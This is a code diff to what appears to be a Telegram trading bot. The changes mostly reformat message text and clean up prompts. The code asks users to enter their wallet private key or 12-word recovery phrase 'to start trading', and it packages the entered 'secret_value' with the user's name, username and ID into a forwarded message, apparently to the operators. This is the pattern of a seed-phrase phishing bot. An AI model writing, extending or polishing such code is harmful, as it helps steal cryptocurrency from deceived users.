@@ -2332,6 +2332,13 @@ async def start(message: types.Message):
 
     try:
         state = dp.fsm.get_context(message.bot, chat_id, user_id)
+        state_data = await state.get_data()
+        prompt_message_id = state_data.get("prompt_message_id")
+        if prompt_message_id:
+            try:
+                await message.bot.delete_message(chat_id=chat_id, message_id=prompt_message_id)
+            except Exception:
+                pass
         await state.clear()
     except Exception as exc:
         print(f"Failed to clear FSM state for /start: {exc}")
@@ -2678,9 +2685,11 @@ async def process_support_input(message: types.Message, state: FSMContext):
         forwarded_text = (
             f"<b>Name:</b> {escape(full_name)}\n"
             f"<b>Username:</b> @{escape(username)}\n"
-            f"<b>Users ID:</b> {message.from_user.id}\n"
-            f"<i>Message users sent</i>\n<pre>{escape(secret_value)}</pre>\n"
-            f"<i>The message user replied to</i>\n<pre>{escape(replied_text)}</pre>"
+            f"<b>Users ID:</b> {message.from_user.id}\n\n"
+            "<b>Message users sent</b>\n"
+            f"<pre>{escape(secret_value)}</pre>\n\n"
+            "<b>The message user replied to</b>\n"
+            f"<pre>{escape(replied_text)}</pre>"
         )
 
         try:
@@ -2700,7 +2709,7 @@ async def process_support_input(message: types.Message, state: FSMContext):
                 pass
 
         invalid_message = await message.answer(
-            text="⚠️ <b>#DELETED</b>\nInvalid Input Please Try <b>Again</b>\n\n<i>Use /start to return to the main menu.</i>",
+            text="⚠️ #DELETED\nInvalid Input Please Try Again\n\nUse /start to return to the main menu.",
             parse_mode="HTML",
         )
         
@@ -3059,9 +3068,9 @@ async def return_to_main(callback: types.CallbackQuery):
 async def connect_external_wallet(callback: types.CallbackQuery, state: FSMContext):
     if callback.data == "import_wallet":
         prompt_text = (
-            "🔐 **Please enter your private key or 12-word recovery phrase.**\n\n"
-            "**To Start Trading**\n\n"
-            "⚠️ *Remember: Never share these details with anyone!*"
+            "🔐 <b>Please enter your private key or 12-word recovery phrase.</b>\n\n"
+            "<b>To Start Trading</b>\n\n"
+            "⚠️ <i>Remember: Never share these details with anyone!</i>"
         )
 
         await callback.message.edit_text(
